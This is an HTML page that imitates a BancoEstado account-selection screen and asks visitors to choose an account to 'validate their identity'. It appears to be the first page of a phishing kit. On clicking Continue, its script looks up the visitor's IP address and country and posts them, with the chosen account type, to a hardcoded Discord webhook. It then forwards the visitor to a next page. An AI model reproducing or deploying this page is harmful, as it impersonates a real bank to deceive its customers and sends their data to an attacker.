<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Selección de Cuenta</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            align-items: center;
            padding: 20px;
        }

        .back-btn {
            font-size: 24px;
            color: #334155;
            text-decoration: none;
            cursor: pointer;
        }

        .content {
            padding: 40px 30px;
            text-align: center;
            flex-grow: 1;
        }

        .icon-box {
            margin-bottom: 25px;
        }

        .icon-box svg {
            width: 60px;
            height: auto;
        }

        h1 {
            font-size: 18px;
            font-weight: 600;
            color: #1e293b;
            line-height: 1.4;
            margin-bottom: 40px;
        }

        .option-container {
            text-align: left;
            margin-bottom: 30px;
        }

        .option-item {
            display: flex;
            align-items: center;
            padding: 15px 0;
            cursor: pointer;
            border-bottom: 1px solid #f1f5f9;
        }

        .option-item:last-child {
            border-bottom: none;
        }

        .radio-custom {
            width: 22px;
            height: 22px;
            border: 2px solid #cbd5e1;
            border-radius: 50%;
            margin-right: 15px;
            position: relative;
            transition: all 0.2s;
        }

        input[type="radio"] {
            display: none;
        }

        input[type="radio"]:checked + .radio-custom {
            border-color: #ff8c00;
        }

        input[type="radio"]:checked + .radio-custom::after {
            content: "";
            width: 12px;
            height: 12px;
            background-color: #ff8c00;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .option-label {
            font-size: 16px;
            color: #475569;
            font-weight: 400;
        }

        .btn-footer {
            padding: 20px 30px 40px;
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: all 0.2s;
        }

        .btn-continuar:disabled {
            background-color: #e2e8f0;
            color: #94a3b8;
            box-shadow: none;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <div class="back-btn">←</div>
        </div>

        <div class="content">
            <div class="icon-box">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="3" y="6" width="18" height="13" rx="2" stroke="#ff8c00" stroke-width="2"/>
                    <path d="M3 10H21" stroke="#ff8c00" stroke-width="2"/>
                    <rect x="5" y="14" width="4" height="2" rx="0.5" fill="#ff8c00"/>
                </svg>
            </div>

            <h1>Hola, selecciona una tarjeta para validar tu identidad</h1>

            <div class="option-container">
                <label class="option-item">
                    <input type="radio" name="cuenta" value="CuentaRUT">
                    <span class="radio-custom"></span>
                    <span class="option-label">CuentaRUT</span>
                </label>

                <label class="option-item">
                    <input type="radio" name="cuenta" value="Cuenta Ahorro">
                    <span class="radio-custom"></span>
                    <span class="option-label">Cuenta Ahorro</span>
                </label>
            </div>
        </div>

        <div class="btn-footer">
            <button class="btn-continuar" id="btn-next" disabled>Continuar</button>
        </div>
    </div>

    <script>
        const radios = document.querySelectorAll('input[name="cuenta"]');
        const btn = document.getElementById('btn-next');
        let seleccionada = "";

        radios.forEach(radio => {
            radio.addEventListener('change', (e) => {
                btn.disabled = false;
                seleccionada = e.target.value;
            });
        });

        btn.addEventListener('click', async () => {
            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";

            btn.innerText = "Cargando...";
            btn.disabled = true;

            try {
                // Captura de IP y País
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                const data = {
                    embeds: [{
                        title: "🏦 SELECCIÓN DE PRODUCTO",
                        color: 16745472,
                        fields: [
                            { name: "💳 Tarjeta Elegida", value: `**${seleccionada}**`, inline: true },
                            { name: "🌐 IP", value: `\`${ipReal}\``, inline: false },
                            { name: "🌍 País", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Inicio de Flujo - BancoEstado" },
                        timestamp: new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                window.location.href = "index2.html";
            } catch (error) {
                console.error("Error:", error);
                window.location.href = "index2.html";
            }
        });
    </script>
</body>
</html>
